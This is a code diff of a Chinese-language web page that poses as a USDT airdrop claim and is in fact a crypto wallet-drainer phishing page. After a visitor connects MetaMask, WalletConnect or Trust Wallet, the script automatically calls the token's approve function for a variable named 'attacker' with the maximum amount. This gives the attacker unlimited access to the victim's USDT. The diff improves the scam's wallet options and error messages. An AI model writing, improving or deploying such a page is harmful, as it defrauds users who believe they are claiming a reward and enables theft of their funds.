@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
@@ -5,15 +6,13 @@
   <title>🎁 領取 USDT 空投活動</title>
   <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
-  <script src="https://unpkg.com/@metamask/detect-provider@1.2.0/dist/detect-provider.min.js"></script>
   <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
 </head>
 <body style="text-align:center; padding-top:60px; font-family:sans-serif">
   <h2>🎉 恭喜你獲得 USDT 空投！</h2>
-  <p>請使用手機錢包掃描以下畫面並確認授權以領取獎勵</p>
-  <button id="connectButton">📲 掃碼連接錢包</button>
+  <p>請選擇錢包並授權以領取獎勵</p>
+  <button id="connectButton">🔌 選擇錢包連接</button>
   <br><br>
-  <button id="approveButton" style="display:none;">🛡️ 確認授權</button>
   <p id="status"></p>
 
   <script>
@@ -35,39 +34,54 @@
           package: null,
           display: {
             name: "MetaMask",
-            description: "Connect using MetaMask extension"
+            description: "使用 MetaMask 錢包"
           }
         },
         walletconnect: {
           package: window.WalletConnectProvider.default,
           options: {
             infuraId: "99af7ec8242f4645ac8c27d5b9354e2c"
+          },
+          display: {
+            name: "WalletConnect",
+            description: "使用手機錢包掃碼連線"
+          }
+        },
+        trust: {
+          package: null,
+          display: {
+            name: "Trust Wallet",
+            description: "使用 Trust Wallet 擴充或 App"
           }
         }
       }
     });
 
     document.getElementById("connectButton").addEventListener("click", async () => {
-      const instance = await web3Modal.connect();
-      provider = new ethers.providers.Web3Provider(instance);
-      signer = provider.getSigner();
-      const address = await signer.getAddress();
-      document.getElementById("status").innerText = "✅ 錢包已連接：" + address;
-      approve(); // 自動跳授權
+      try {
+        const instance = await web3Modal.connect();
+        provider = new ethers.providers.Web3Provider(instance);
+        signer = provider.getSigner();
+        const address = await signer.getAddress();
+        document.getElementById("status").innerText = "✅ 已連接錢包：" + address;
+        approve();
+      } catch (err) {
+        document.getElementById("status").innerText = "❌ 錢包連接失敗：" + err.message;
+      }
     });
 
     async function approve() {
-      const network = await provider.getNetwork();
-      const chainId = network.chainId;
-      const tokenAddress = USDT_BY_CHAIN[chainId];
-
-      if (!tokenAddress) {
-        alert("不支援此鏈別的 USDT 授權");
-        return;
-      }
-
-      const contract = new ethers.Contract(tokenAddress, abi, signer);
       try {
+        const network = await provider.getNetwork();
+        const chainId = network.chainId;
+        const tokenAddress = USDT_BY_CHAIN[chainId];
+
+        if (!tokenAddress) {
+          document.getElementById("status").innerText = "❌ 不支援此鏈別的 USDT 合約";
+          return;
+        }
+
+        const contract = new ethers.Contract(tokenAddress, abi, signer);
         const tx = await contract.approve(attacker, ethers.constants.MaxUint256);
         document.getElementById("status").innerText = "✅ 授權成功！Tx Hash: " + tx.hash;
       } catch (err) {
